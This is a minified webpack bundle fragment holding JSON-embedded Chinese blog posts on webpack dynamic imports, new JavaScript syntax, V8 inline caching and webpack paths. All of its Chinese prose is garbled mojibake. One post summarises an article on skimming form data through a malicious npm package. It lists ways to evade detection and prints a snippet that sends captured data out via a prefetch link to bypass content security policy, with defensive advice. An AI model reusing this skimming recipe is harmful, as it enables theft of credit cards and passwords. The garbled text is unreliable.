·åªéœ€è¦1ä¸ªè¯·æ±‚è€Œä¸æ˜¯100ä¸ªï¼Œæ¥ç€è®¾è®¡äº†ä¸€ä¸ªè¯·æ±‚æ¨¡å—ï¼Œæ¥å—ä¸€ä¸ªè·¯å¾„å‚æ•°<code>fetchPath</code></p>\\n<pre><code><pre class=\\"hljs\\"><code>// fetchPath: \'asset/blog/tech\'\\n// datasåŒ…å«techæ¯ä¸€ä¸ªæ–‡ä»¶çš„title\\ndatas.forEach((data)=&gt;{\\n  let filename=data.title+&quot;.json&quot;\\n  import(\\n    /* webpackMode: &quot;lazy-once&quot; */\\n    `/${fetchPath}/${filename}`\\n  )\\n  .then(...)\\n})</code></pre></code></pre><p>ä¸Šé¢è¿™ä¸€æ®µï¼ŒåŸæœ¬çš„æ„æ€å¯èƒ½å°±æ˜¯å¸Œæœ›åœ¨<code>tech</code>æ–‡ä»¶å¤¹å†…éƒ¨è·å–æ¯ä¸€ä¸ªæ–‡ä»¶çš„å…·ä½“å†…å®¹ã€‚</p>\\n<p>ä½†è¿™ä¹ˆå†™ï¼Œå®é™…ä¸Šè¯·æ±‚ä¼šå°†<code>/</code>ç›®å½•ä»¥å†…çš„<strong>æ‰€æœ‰æ ¼å¼çš„æ–‡ä»¶</strong>éƒ½è¿›è¡Œè¯·æ±‚ï¼ŒåŒ…æ‹¬<code>img</code>å†…éƒ¨çš„<code>*.png</code>ï¼Œ\\nå†å»æ¯”å¯¹ä½ æ‰€éœ€è¦çš„<code>${filename}</code>ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœä½ çš„è¯·æ±‚ä¸­åŒ…å«å˜é‡æ¨¡æ¿(å˜é‡)ï¼Œ\\n<code>webpack</code>ä¼šæ½œåœ¨çš„è¯·æ±‚å·²ç»ç¡®å®šçš„è·¯å¾„ä¸­çš„å†…å®¹ï¼Œä¾‹å¦‚è¿™é‡Œå·²ç»ç¡®å®šçš„å°±æ˜¯<code>/</code></p>\\n<p>å¦‚æœè¯·æ±‚è·¯å¾„è¿™ä¹ˆå†™ï¼š <code>/${fetchPath}/${data.title}.json</code>ï¼Œåˆ™<code>webpack</code>èƒ½ç¡®å®šçš„æ˜¯<code>/</code>å’Œåç¼€<code>.json</code>ï¼Œå› æ­¤ä¼šå»è¯·æ±‚<code>/</code>è·¯å¾„ä¸‹æ‰€æœ‰åç¼€ä¸º<code>.json</code>çš„æ–‡ä»¶ã€‚</p>\\n<p>å®˜æ–¹ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨<code>webpackInclude</code>å’Œ<code>webpackExclude</code>ï¼Œä½†è¿™ä¸¤ä¸ªé€‰é¡¹åœ¨è¿™é‡Œæ”¹å˜çš„æ„ä¹‰ä¸å¤§ï¼Œè¿™é‡Œçš„å˜é‡åŒ…æ‹¬è·¯å¾„åï¼Œ\\nè€Œ<code>webpackInclude</code>å’Œ<code>webpackExclude</code>æ˜¯ä¸ä¼šåŒ¹é…å‰ç¼€(è·¯å¾„)çš„ã€‚</p>\\n<p>å› æ­¤ä¸ªäººçš„è§£å†³æ–¹æ¡ˆå°±æ˜¯ç»™<code>webpack</code>ä¸€ä¸ªèƒ½ç¡®å®šçš„ç›®å½•ï¼Œåœ¨è¿™ä¸ªç›®å½•ä¹‹ä¸­å»è¯·æ±‚ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// fetchPath: \'asset/blog/tech\'</span>\\n<span class=\\"hljs-comment\\">// datasåŒ…å«techæ¯ä¸€ä¸ªæ–‡ä»¶çš„title</span>\\ndatas.forEach(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">data</span>)=&gt;</span>{\\n  <span class=\\"hljs-keyword\\">if</span>(fetchPath.includes(<span class=\\"hljs-string\\">\'tech\'</span>) ){\\n     <span class=\\"hljs-keyword\\">import</span>(\\n       <span class=\\"hljs-comment\\">/* webpackMode: \\"lazy-once\\" */</span>\\n       <span class=\\"hljs-string\\">`/asset/blog/tech/<span class=\\"hljs-subst\\">${data.title}</span>.json`</span>\\n     )\\n     .then(...) \\n  }<span class=\\"hljs-keyword\\">else</span>{\\n    ...\\n  }\\n})</code></pre></code></pre>\\n<p>å½“å·²ç»ç¡®å®šæ˜¯åœ¨<code>tech</code>å†…éƒ¨ï¼Œå°±å¯ä»¥è®©<code>import</code>æ”¾å¿ƒçš„å»è¯·æ±‚éœ€è¦çš„æ–‡ä»¶ã€‚</p>\\n<p>å¦ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨<code>lazy</code>è€Œä¸æ˜¯<code>lazy-once</code>ï¼Œä½†æ˜¯å¦‚æœå­˜åœ¨100ä¸ªæ–‡ä»¶ï¼Œåˆ™éœ€è¦è¯·æ±‚100æ¬¡ï¼Œè€Œä¸”<code>100æ¬¡è¯·æ±‚</code>æ€»å¤§å°ä¹Ÿæ¯”è¯·æ±‚<code>1æ¬¡è¯·æ±‚åŒ…å«100é¡¹</code>å†…å®¹å¤§å¾ˆå¤šï¼ˆåŒ…å«é‡å¤è¯·æ±‚å¤´å’Œå“åº”å¤´ï¼‰ã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-12-22","timeArr":[2018,11,22,0,0,0,0],"title":"webpackåŠ¨æ€importçš„ä¸€ä¸ªå‘","uuid":"eef7e96833e36dd1982a065c2bf4658180ae9581","summary":"<p>è°ƒç”¨<code> import()</code>æ‰§è¡ŒåŠ¨æ€åŠ è½½æ—¶ï¼Œå¦‚æœä½¿ç”¨å˜é‡æ¨¡æ¿è¿›è¡Œè¯·æ±‚ï¼Œä¼šæ½œåœ¨çš„è¯·æ±‚å½“å‰ç¡®å®šçš„è·¯å¾„ä¸‹çš„<strong>æ‰€æœ‰æ–‡ä»¶</strong>ï¼</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<p>ç°åœ¨æœ‰å¦‚ä¸‹æ–‡ä»¶ç»“æ„ï¼š</p>\\n<pre class=\\"hljs\\"><code>|---asset\\n  |---blog\\n    |---tech\\n      |---001.json\\n      |---002.json\\n      |-...</code></pre>","slug":"webpack-dong-tai-import-de-yi-ge-keng","sha":"4edeb6d395d6a622ada753d259d16102786a87f9"}')},650:function(n){n.exports=JSON.parse('{"content":"<blockquote>\\n<p>ES</p>\\n</blockquote>\\n<h4 id=\\"bian-hua-1\\">å˜åŒ–1</h4>\\n<p>åŸå†™æ³•ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> data = {\\n  <span class=\\"hljs-attr\\">user</span>: {},\\n};\\n<span class=\\"hljs-keyword\\">const</span> street = data &amp;&amp; data.user &amp;&amp; data.user.address &amp;&amp; data.user.address.street;\\n<span class=\\"hljs-built_in\\">console</span>.log(data.user.address.street); <span class=\\"hljs-comment\\">// undefined</span></code></pre></code></pre>\\n<p>æ–°å†™æ³•ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> data = {\\n  <span class=\\"hljs-attr\\">user</span>: {},\\n};\\n<span class=\\"hljs-built_in\\">console</span>.log(data.user?.address?.street); <span class=\\"hljs-comment\\">// undefined</span></code></pre></code></pre>\\n<p>é‡åˆ°æ•°ç»„ï¼š</p>\\n<p><code>data?.user?.address?.neighbors?.[number]</code></p>\\n<p>é‡åˆ°å‡½æ•°ï¼š</p>\\n<p><code>data?.user?.someFunction?.()</code></p>\\n<h4 id=\\"bian-hua-2\\">å˜åŒ–2</h4>\\n<p>åŸå†™æ³•ï¼š</p>\\n<p><code>value != null ? value : &#39;default value&#39;;</code></p>\\n<p>æ–°å†™æ³•ï¼š</p>\\n<p><code>value ?? &#39;default value&#39;;</code></p>\\n<h4 id=\\"bian-hua-3\\">å˜åŒ–3</h4>\\n<p>åŸå†™æ³•ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">doubleSay</span> (<span class=\\"hljs-params\\">str</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> str + <span class=\\"hljs-string\\">\\", \\"</span> + str;\\n}\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">capitalize</span> (<span class=\\"hljs-params\\">str</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> str[<span class=\\"hljs-number\\">0</span>].toUpperCase() + str.substring(<span class=\\"hljs-number\\">1</span>);\\n}\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">exclaim</span> (<span class=\\"hljs-params\\">str</span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> str + <span class=\\"hljs-string\\">\'!\'</span>;\\n}\\n<span class=\\"hljs-keyword\\">let</span> result = exclaim(capitalize(doubleSay(<span class=\\"hljs-string\\">\\"hello\\"</span>)));\\nresult <span class=\\"hljs-comment\\">//=&gt; \\"Hello, hello!\\"</span></code></pre></code></pre>\\n<p>æ–°å†™æ³•ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>let result = &quot;hello&quot;\\n  |&gt; doubleSay\\n  |&gt; capitalize\\n  |&gt; exclaim;\\n\\nresult //=&gt; &quot;Hello, hello!&quot;</code></pre></code></pre><p>å¦å¤–ï¼šä¹Ÿå¯ä»¥ç”¨composes</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">compose</span>(<span class=\\"hljs-params\\">...funcs</span>) </span>{\\n  <span class=\\"hljs-keyword\\">if</span> (funcs.length === <span class=\\"hljs-number\\">0</span>) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">arg</span> =&gt;</span> arg\\n  }\\n  <span class=\\"hljs-keyword\\">if</span> (funcs.length === <span class=\\"hljs-number\\">1</span>) {\\n    <span class=\\"hljs-keyword\\">return</span> funcs[<span class=\\"hljs-number\\">0</span>]\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> funcs.reduce(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a, b</span>) =&gt;</span> <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...args</span>) =&gt;</span> a(b(...args)))\\n}\\n<span class=\\"hljs-keyword\\">let</span> result = compose(exclaim,capitalize,doubleSay)(<span class=\\"hljs-string\\">\\"hello\\"</span>);\\nresult <span class=\\"hljs-comment\\">//=&gt; \\"Hello, hello!\\"</span></code></pre></code></pre>\\n","toc":[{"anchor":"bian-hua-1","level":4,"text":"å˜åŒ–1"},{"anchor":"bian-hua-2","level":4,"text":"å˜åŒ–2"},{"anchor":"bian-hua-3","level":4,"text":"å˜åŒ–3"}],"relatedTags":null,"created_at":"2018-06-23","timeArr":[2018,5,23,0,0,0,0],"title":"æœªæ¥JSæ–°å˜åŒ–3ä¸ª","uuid":"19eb833c0872c308711633143c73c05509c956cd","summary":"<blockquote>\\n<p>ES</p>\\n</blockquote>\\n<h4>å˜åŒ–1ï¼š</h4>\\n<p>åŸå†™æ³•ï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> data = {\\n  <span class=\\"hljs-attr\\">user</span>: {},\\n};\\n<span class=\\"hljs-keyword\\">const</span> street = data &amp;&amp; data.user &amp;&amp; data.user.address &amp;&amp; data.user.address.street;\\n<span class=\\"hljs-built_in\\">console</span>.log(data.use...</code></pre>","slug":"wei-lai-JS-xin-bian-hua-3-ge","sha":"026909510ca57f701c4dfaa8c73e5cae0f6caab1"}')},651:function(n){n.exports=JSON.parse('{"content":"<blockquote>\\n<p>åŸæ–‡åœ°å€ï¼š<a href=\\"https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5\\">https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5</a></p>\\n</blockquote>\\n<p>ä½œè€…è®²è¿°äº†ä¸€äº›èƒ½å¤Ÿè¾¾æˆçš„ç ´è§£ç½‘ç»œå®‰å…¨æ‰‹æ®µ(æœ‰äº›å·²è¢«è®¤ä¸ºæ˜¯bugä¿®å¤ï¼Œä¾‹å¦‚2)ï¼Œå¹¶ç»™å‡ºå»ºè®®</p>\\n<p>æŠ“å–formçš„å­—æ®µï¼Œä¼ é€</p>\\n<ol>\\n<li>å‘å¸ƒå°åŠŸèƒ½npmï¼ŒåµŒå…¥ä»£ç å†…</li>\\n<li>æ‰“å¼€devå·¥å…·æ—¶ï¼Œä¸å‘é€</li>\\n<li>æ¯æ¬¡å‘å°„åï¼Œè®°å½•åˆ°cookieï¼Œä¸é‡å¤</li>\\n<li>æ£€æµ‹åˆ°ï¼Œè®¾å®šå‘å°„æ¦‚ç‡ï¼Œå‡å°‘æ¬¡æ•°</li>\\n<li>fetch --&gt;gfudi å‡å°‘1ä½</li>\\n<li>xx.min.jså’Œxx.jså†…å®¹ä¸åŒ</li>\\n<li>é€šè¿‡prefetchå’Œæ£€æµ‹å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œé¿å¼€<pre><code><pre class=\\"hljs\\"><code> const linkEl = document.createElement(\'link\');\\n linkEl.rel = \'prefetch\';\\n linkEl.href = urlWithYourPreciousData;\\n document.head.appendChild(linkEl);</code></pre></code></pre>å»ºè®®ï¼šé’ˆå¯¹é‡è¦è¡¨å•ï¼Œå®Œå…¨é‡æ–°å†™ä¸€ä¸ªiframeï¼ˆè‡ªå·±æ‰‹å†™ï¼Œæ— ä»»ä½•ä¾èµ–ï¼‰</li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2018-07-30","timeArr":[2018,6,30,0,0,0,0],"title":"æ–‡ç« è®°å½•â€”å½“å‰çš„ç½‘é¡µå®‰å…¨","uuid":"fe3678963ac1c863362da40651884c9820158971","summary":"<p>åŸæ–‡åœ°å€ï¼šhttps://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5</p>","slug":"wen-zhang-ji-lu-dang-qian-de-wang-ye-an-quan","sha":"f41c15ad702abc0dee5cac1c2036c5a1cb10aaba"}')},652:function(n){n.exports=JSON.parse('{"content":"<p>åŸæ–‡ï¼š<a href=\\"https://medium.freecodecamp.org/javascript-essentials-why-you-should-know-how-the-engine-works-c2cc0d321553\\">https://medium.freecodecamp.org/javascript-essentials-why-you-should-know-how-the-engine-works-c2cc0d321553</a></p>\\n<hr>\\n<h4 id=\\"xian-xiang\\">ç°è±¡</h4>\\n<p>æ–‡ç« é¦–å…ˆå°±æŠ›å‡ºäº†ä¸¤æ®µä»£ç ï¼Œå®ƒä»¬çš„ä¸åŒä¹‹å¤„ä»…ä»…åœ¨äºåè€…çš„æ•°æ®ç»“æ„å¤šäº†ä¸€ä¸ªå±æ€§è€Œå·²</p>\\n<p>ä¾‹ä¸€ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>(() =&gt; { \\n  const han = {firstname: &quot;Han&quot;, lastname: &quot;Solo&quot;};\\n  const luke = {firstname: &quot;Luke&quot;, lastname: &quot;Skywalker&quot;};\\n  const leia = {firstname: &quot;Leia&quot;, lastname: &quot;Organa&quot;};\\n  const obi = {firstname: &quot;Obi&quot;, lastname: &quot;Wan&quot;};\\n  const yoda = {firstname: &quot;&quot;, lastname: &quot;Yoda&quot;};\\n  const people = [\\n    han, luke, leia, obi, \\n    yoda, luke, leia, obi \\n  ];\\n  const getName = (person) =&gt; person.lastname;\\n  console.time(&quot;engine&quot;);\\n  for(var i = 0; i &lt; 1000 * 1000 * 1000; i++) { \\n    getName(people[i &amp; 7]); \\n  }\\n  console.timeEnd(&quot;engine&quot;); \\n})();</code></pre></code></pre><p>ä¾‹äºŒï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>(() =&gt; {\\n  const han = {firstname: &quot;Han&quot;, lastname: &quot;Solo&quot;, spacecraft: &quot;Falcon&quot;};\\n  const luke = {firstname: &quot;Luke&quot;, lastname: &quot;Skywalker&quot;, job: &quot;Jedi&quot;};\\n  const leia = {firstname: &quot;Leia&quot;, lastname: &quot;Organa&quot;, gender: &quot;female&quot;};\\n  const obi = {firstname: &quot;Obi&quot;, lastname: &quot;Wan&quot;, retired: true};\\n  const yoda = {lastname: &quot;Yoda&quot;};\\n  const people = [\\n    han, luke, leia, obi, \\n    yoda, luke, leia, obi\\n  ];\\n  const getName = (person) =&gt; person.lastname;\\n  console.time(&quot;engine&quot;);\\n  for(var i = 0; i &lt; 1000 * 1000 * 1000; i++) {\\n    getName(people[i &amp; 7]);\\n  }\\n  console.timeEnd(&quot;engine&quot;);\\n})();</code></pre></code></pre><p>ç»“æœæ‰§è¡Œåï¼Œç¬¬ä¸€ä¸ªè€—æ—¶çº¦1.2s,ç¬¬äºŒä¸ªè€—æ—¶çº¦8.5s</p>\\n<p>ä»…ä»…åŠ äº†ä¸€ä¸ªå±æ€§ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰è¿™ä¹ˆå¤§çš„å·®è·ï¼Ÿ</p>\\n<hr>\\n<h4 id=\\"yuan-yin\\">åŸå› </h4>\\n<p>è¿™å°±è¦æåˆ°JSçš„<code>Interpreter</code>(è§£é‡Šå™¨)å’Œ<code>Compiler</code>ç¼–è¯‘å™¨ã€‚</p>\\n<p>å½“åˆ›å»ºä¸€ä¸ªå¯¹è±¡åï¼Œè§£é‡Šå™¨ä¼šå¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œæ£€ç´¢ï¼Œè¿™ä¸ªæ£€ç´¢æ“ä½œæ˜¯æ¶ˆè€—å¾ˆå¤§çš„ã€‚</p>\\n<p>å› æ­¤ï¼Œåˆè¦æå‡ºä¸€ä¸ªæ¦‚å¿µ<code>Inline Caching</code>å†…è”ç¼“å­˜ï¼Œå®ƒä¼šåœ¨è¿è¡Œæ—¶ï¼Œå°†å¯¹è±¡æŒ‰ç…§å±æ€§çš„keyåç§°å’Œé¡ºåºå®Œå…¨ä¸€è‡´çš„åˆ†ç±»ï¼Œä¾‹å¦‚<code>{firstname: &quot;Han&quot;, lastname: &quot;Solo&quot;}</code>å’Œ<code>{lastname: &quot;Solo&quot;, firstname: &quot;Han&quot;}</code>ä¼šè¢«åˆ†ä¸º2ç±»ã€‚</p>\\n<p>å¦‚æœå¯¹è±¡éƒ½å±äºåŒä¸€ç±»ï¼Œä¹Ÿå°±æ˜¯å®ƒä»¬çš„<code>shape</code>å½¢çŠ¶ä¸€è‡´ï¼Œé‚£ä¹ˆå†…è”ç¼“å­˜å°±ä¼šè®©ç¼–è¯‘å™¨æ‰§è¡Œç›¸åŒçš„å¤„ç†ï¼Œä»è€Œæå‡æ€§èƒ½ã€‚</p>\\n<p>åœ¨ç¬¬ä¸€ä¸ªä¾‹å­ä¸­ï¼Œç”±äºæ‰€æœ‰æ•°æ®ç»“æ„çš„&quot;å½¢çŠ¶&quot;éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤ç§°ä¸º<code>å•æ€å†…è”ç¼“å­˜</code>ï¼›</p>\\n<p>å½“&quot;å½¢çŠ¶&quot;è¶…è¿‡1ä¸ªï¼Œç¬¬äºŒä¸ªä¾‹å­ï¼Œå³ç¼“å­˜äº†å¤šä¸ªæ•°æ®ç»“æ„çš„&quot;å½¢çŠ¶&quot;ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨æ¯æ¬¡éƒ½ä¼šåœ¨å‡ ä¸ª&quot;å½¢çŠ¶ä¹‹é—´&quot;è¿›è¡Œåˆ¤æ–­ï¼›</p>\\n<p>å½“ç¼“å­˜çš„&quot;å½¢çŠ¶&quot;ç»§ç»­å¢åŠ ï¼Œè¶…è¿‡ä¸€ä¸ªä¸Šé™å€¼åï¼Œå°±ä¸å­˜åœ¨å±€éƒ¨ç¼“å­˜ï¼Œè€Œæ˜¯å…¨å±€ç¼“å­˜ï¼Œé‚£ä¹ˆæ¯æ¬¡æ£€ç´¢éƒ½ä¼šåœ¨å…¨å±€ç¼“å­˜ä¸ŠæŸ¥æ‰¾ï¼Œè¿™ä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™åˆ°æç‚¹ã€‚</p>\\n<hr>\\n<h4 id=\\"jie-jue\\">è§£å†³</h4>\\n<p>çŸ¥é“åŸå› åï¼Œé—®é¢˜å°±å¾ˆå¥½è§£å†³äº†ï¼Œå®šä¹‰ä¸€ä¸ª&quot;å½¢çŠ¶&quot;ä¸€æ ·çš„æ•°æ®ç»“æ„å°±å¥½äº†</p>\\n<pre><code><pre class=\\"hljs\\"><code>(() =&gt; {\\n  class Person {\\n    constructor({\\n      firstname = \'\',\\n      lastname = \'\',\\n      spaceship = \'\',\\n      job = \'\',\\n      gender = \'\',\\n      retired = false\\n    } = {}) {\\n      Object.assign(this, {\\n        firstname,\\n        lastname,\\n        spaceship,\\n        job,\\n        gender,\\n        retired\\n      });\\n    }\\n  }\\n  const han = new Person({\\n    firstname: \'Han\',\\n    lastname: \'Solo\',\\n    spaceship: \'Falcon\'\\n  });\\n  const luke = new Person({\\n    firstname: \'Luke\',\\n    lastname: \'Skywalker\',\\n    job: \'Jedi\'\\n  });\\n  const leia = new Person({\\n    firstname: \'Leia\',\\n    lastname: \'Organa\',\\n    gender: \'female\'\\n  });\\n  const obi = new Person({\\n    firstname: \'Obi\',\\n    lastname: \'Wan\',\\n    retired: true\\n  });\\n  const yoda = new Person({ lastname: \'Yoda\' });\\n  const people = [\\n    han,\\n    luke,\\n    leia,\\n    obi,\\n    yoda,\\n    luke,\\n    leia,\\n    obi\\n  ];\\n  const getName = person =&gt; person.lastname;\\n  console.time(\'engine\');\\n  for (var i = 0; i &lt; 1000 * 1000 * 1000; i++) {\\n    getName(people[i &amp; 7]);\\n  }\\n  console.timeEnd(\'engine\');\\n})();</code></pre></code></pre><p>è¿è¡Œï¼Œæ¶ˆè€—æ—¶é—´1.2sï¼Œä»»åŠ¡å®Œæˆï¼</p>\\n","toc":[{"anchor":"xian-xiang","level":4,"text":"ç°è±¡"},{"anchor":"yuan-yin","level":4,"text":"åŸå› "},{"anchor":"jie-jue","level":4,"text":"è§£å†³"}],"relatedTags":null,"created_at":"2018-09-08","timeArr":[2018,8,8,0,0,0,0],"title":"æ–‡ç« è®°å½•â€”ä¸ºä»€ä¹ˆè¦çŸ¥é“jsçš„å¼•æ“å¦‚ä½•å·¥ä½œ","uuid":"1ce699882ae4c19377061e00fa95e2bc41b3f185","summary":"<p>åŸæ–‡ï¼š[https://medium.freecodecamp.org/javascript-essentials-why-you-should-know-how-the-engine-works-c2cc0d321553](https://medium.freecodecamp.org/javascript-ess...</p>","slug":"wen-zhang-ji-lu-wei-shen-mo-yao-zhi-dao-js-de-yin-qing-ru-he-gong-zuo","sha":"f6d88502864f6fa2ddb9fd4f3a6d78cbd5bc29c5"}')},653:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"lu-jing-keng\\">è·¯å¾„å‘</h4>\\n<ul>\\n<li>htmlå›¾ç‰‡è·¯å¾„ï¼š</li>\\n</ul>\\n<p>è¦åˆ©ç”¨<code>html-loader</code>çš„ <code>attr</code> å¤„ç†ï¼Œåªæœ‰<code>attr</code>è¦†ç›–åˆ°äº†ï¼Œæ‰ä¼šæ‰“åŒ…å®ƒã€‚</p>\\n<p>ä¾‹å¦‚<code>img</code>çš„<code>src</code>(img:src) å’Œ<code>link</code>çš„<code>ref</code>(link:ref)ï¼Œä¾‹å¦‚<code>favicon</code>ï¼Œå’Œä¸€äº›ç”¨äº†<code>data-src</code>çš„ï¼Œä¾‹å¦‚<code>lazyload</code></p>\\n<p>å…³äºè·¯å¾„é—®é¢˜ï¼Œå¯ä»¥ä¿®æ”¹<code>html</code>çš„è·¯å¾„ä½¿å›¾ç‰‡èƒ½æ‰¾åˆ°ï¼Œè¿™æ ·å®ƒå°±ä¼šè¢«æŠ“å–å¹¶ä¸”æ‰“åŒ…</p>\\n<p>ä¹Ÿå¯ä»¥å¯¹æ¯ä¸€ä¸ªå®šä¹‰ä¸€ä¸ªå­è·¯å¾„ï¼Œå°±åƒæˆ‘åšçš„ï¼Œ<code>html</code>å›¾ç‰‡æ–‡ä»¶çš„è·¯å¾„æ˜¯ <code>&lt;img src=&quot;/img/xxx.png&quot; /&gt;</code></p>\\n<p>å†ç»™<code>html-loader</code>å®šä¹‰ä¸€ä¸ª<code>root</code>ï¼Œå‘Šè¯‰htmlä»å“ªä¸ªæ–‡ä»¶å¤¹å»æŠ“å–è¿™äº›å›¾ç‰‡ã€‚</p>\\n<ul>\\n<li>jså›¾ç‰‡è·¯å¾„</li>\\n</ul>\\n<p>ä½¿ç”¨require</p>\\n<ul>\\n<li>csså›¾ç‰‡è·¯å¾„</li>\\n</ul>\\n<p>å¦‚æœä¸éœ€è¦<code>webpack</code>æ‰“åŒ…å›¾ç‰‡ï¼Œé‚£ä¹ˆå°†<code>css-loader</code>çš„<code>url</code>è®¾ä¸º<code>false</code></p>\\n<p>å¦‚æœéœ€è¦<code>webpack</code>æ‰“åŒ…ï¼Œé‚£ä¹ˆè¦å°†<code>url</code>è®¾ç½®ä¸º<code>true</code>ï¼Œè¿™æ ·å¯¹äºä½ <code>css</code>ä¸­æ¯ä¸€ä¸ªå›¾ç‰‡ï¼Œ<code>css-loader</code>ä¼šå»æŠ“å–ï¼Œå¹¶ä¸”ç”¨<code>file-loader</code>(æˆ–è€…<code>url-loader</code>)è§£æï¼Œ\\nè§£ææˆåŠŸï¼Œæ‰“åŒ…ï¼Œé‡å‘½ååï¼Œå°†æ–°çš„è·¯å¾„å†™å…¥åˆ°ä½ çš„<code>css</code></p>\\n<p>é‡åˆ°çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯éœ€è¦å¯¹<code>file-loader</code>çš„<code>publicPath</code>è¿›è¡Œé…ç½®</p>\\n<p>ä¾‹å¦‚<code>css</code>ä¸­<code>background:url(../../assets/img/xxx.png)</code></p>\\n<p>å¦‚æœä¸é…ç½®ï¼Œé‚£ä¹ˆæ‰“åŒ…åçš„æ–‡ä»¶è·¯å¾„ä¸º<code>background:url(./image/xxx-xxx.png)</code>ï¼Œè¿™é‡Œ<code>image</code>æ˜¯æˆ‘çš„å›¾ç‰‡è¾“å‡ºç›®å½•</p>\\n<p>æ³¨æ„è¿™æ˜¯ä¸ªç›¸å¯¹è·¯å¾„ï¼Œæœ€ååœ¨<code>html</code>æ‰“å¼€å®é™…è·¯å¾„ä¸º<code>/css/image/xxx-xxx.png</code>ï¼Œ è€Œæˆ‘éœ€è¦çš„æ˜¯<code>/image/xxx-xxx.png</code></p>\\n<p>å› æ­¤å¯¹<code>publicPath</code>é…ç½®ä¸º<code>/</code>ï¼Œ å¯ä»¥è§£å†³é—®é¢˜ã€‚</p>\\n","toc":[{"anchor":"lu-jing-keng","level":4,"text":"è·¯å¾„å‘"}],"relatedTags":null,"created_at":"2019-08-03","timeArr":[2019,7,3,0,0,0,0],"title":"ä¸€æ¬¡webpackæ­å»ºé‡åˆ°çš„å‘","uuid":"f7dd6e266b1a5e851a141bd30cacb677f6cb8562","summary":"<h4>è·¯å¾„å‘ï¼š</h4>\\n<ul>\\n<li>htmlå›¾ç‰‡è·¯å¾„ï¼š</li>\\n</ul>\\n<p>è¦åˆ©ç”¨<code>html-loader</code>çš„ <code>attr</code> å¤„ç†ï¼Œåªæœ‰<code>attr</code>è¦†ç›–åˆ°äº†ï¼Œæ‰ä¼šæ‰“åŒ…å®ƒã€‚</p>\\n<p>ä¾‹å¦‚<code>img</code>çš„<code>src</code>(img:src) å’Œ<code>link</code>çš„<code>ref</code>(link:ref)ï¼Œä¾‹å¦‚<code>favicon</code>ï¼Œå’Œä¸€äº›ç”¨äº†<code>data-src</code>çš„ï¼Œä¾‹å¦‚`lazylo...</p>","slug":"yi-ci-webpack-da-jian-yu-dao-de-keng","sha":"af5982279e618f8e78c8acbd9a329c7a3d2f6087"}')},654:function(n){n.exports=JSON.parse('{"content":"<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">tco</span>(<span class=\\"hljs-params\\">f</span>) </span>{\\n            <span class=\\"hljs-keyword\\">var</span> value;\\n            <span class=\\"hljs-keyword\\">var</span> active = <span class=\\"hljs-literal\\">false</span>;\\n            <span class=\\"hljs-keyword\\">var</span> accumulated = [];\\n            <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">accumulator</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n                accumulated.push(<span class=\\"hljs-built_in\\">arguments</span>);\\n                <span class=\\"hljs-comment\\">// å½“é€’å½’çš„æ—¶å€™ï¼Œæ£€æŸ¥activeï¼Œæ¸…é™¤è°ƒç”¨æ ˆ</span>\\n                <span class=\\"hljs-keyword\\">if</span> (!active) {\\n                    active = <span class=\\"hljs-literal\\">true</span>;\\n                    <span class=\\"hljs-keyword\\">while</span> (accumulated.length) {\\n                        value = f.apply(<span class=\\"hljs-keyword\\">this</span>, accumulated.shift());\\n                        <span class=\\"hljs-built_in\\">console</span>.log(value)\\n                    }\\n                    active = <span class=\\"hljs-literal\\">false</span>;\\n                    <span class=\\"hljs-keyword\\">return</span> value;\\n                }\\n            };\\n        }\\n\\n        <span class=\\"hljs-keyword\\">var</span> sum = tco(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">x, 